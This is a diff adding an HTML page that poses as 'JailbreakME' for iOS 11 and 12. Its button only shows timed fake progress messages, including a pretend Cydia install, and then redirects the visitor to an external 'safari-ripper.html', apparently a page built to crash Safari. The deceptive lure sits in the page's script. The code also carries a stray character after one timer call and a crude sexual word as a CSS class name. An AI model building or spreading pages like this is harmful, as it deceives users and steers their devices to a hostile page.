@@ -1,0 +1,110 @@
+<html>
+  <head>
+    <style>
+      body {
+        font-family: 'Montserrat', sans-serif;
+        font-weight: 10;
+        background-color: #ddd;
+      }
+      h3.disclaimer {
+        position: fixed;
+        bottom: 0;
+        font-style: italic;
+        font-weight: 500;
+        font-size: 10pt;
+      }
+      h1.jbme {
+        font-weight: 1000;
+        font-size: 30pt;
+        margin-bottom: -0px;
+      }
+      h1.iosv {
+        font-weight: 600;
+        font-size: 12pt;
+        color: #333;
+        margin-bottom: -0px;
+      }
+      h1.credits {
+        font-weight: 200;
+        font-size: 10pt;
+      }
+      h1.credits1 {
+        font-weight: 700;
+       }
+      div.rape {
+        padding: 15px;
+        background-color: #fff;
+        border-radius: 15px;
+        width: 320px;
+        height: 300px;
+      }
+      a.jblol {
+        background-color: #000000;
+        border-radius: 2000px;
+        padding: 15px 90px 15px 96px;
+        color: white;
+        font-weight: 600;
+      }
+      a.jblol:hover {
+        background-color:  #0089C4;
+        font-weight: 600;
+      }
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,500,600" rel="stylesheet">
+    <title>Jailbreakme Thử Nghiệm</title>
+  </head>
+  <body onload="hideProgress()">
+    <center><div class="rape">
+    <center><h1 class="jbme">JailbreakME</h1></center>
+    <center><h1 class="iosv">iOS 11 and iOS 12</h1></center>
+    <center><h1 class="credits">by Yangcheesen; H_PW2NTP; Zlab Team</h1>
+<h3 class="disclaimer">An incomplete jailbreak. Will probably Reboot.</h1></center>
+    <center><h1 class="credits1" id="prog">Please Wait...(1/5)</h1></center>
+    <br>
+    <br>
+    <br>
+    <a class="jblol" id="btn" onclick="jailbreak()">JAILBREAK</a>
+  </div></center>
+  
+  </body>
+  <script>
+  function hideProgress() {
+    var x = document.getElementById("prog");
+    x.style.display = "none";
+  }
+  function jailbreak() {
+    var a = document.getElementById("prog");
+    var b = document.getElementById("btn");
+    a.style.display = "block";
+    b.style.display = "none";
+    setTimeout(function () {
+      
+document.getElementById("prog").innerHTML = "Please Wait... (2/5)";
+    }, 4000);
+    setTimeout(function () {
+
+document.getElementById("prog").innerHTML = "Please Wait... (3/5)";
+    }, 6000);
+    setTimeout(function () {
+
+document.getElementById("prog").innerHTML = "Please Wait... (4/5)";
+    }, 10000);
+    setTimeout(function () {
+
+document.getElementById("prog").innerHTML = "Please Wait... (5/5)";
+    }, 15000);q
+    setTimeout(function () {
+
+document.getElementById("prog").innerHTML = "Please Wait...(Intstalling Cydia)";
+    }, 40000);
+    setTimeout(function () {
+
+document.getElementById("prog").innerHTML = "Please Wait...(Reboot:(";
+    }, 50000);
+    setTimeout(function () {
+      document.location.href="https://cdn.rawgit.com/pwnsdx/ce64de2760996a6c432f06d612e33aea/raw/23f2faa0aadb4babbfd228c8bb32a26a8c51c741/safari-ripper.html";
+    }, 12000);
+  }
+  </script>
+</html>
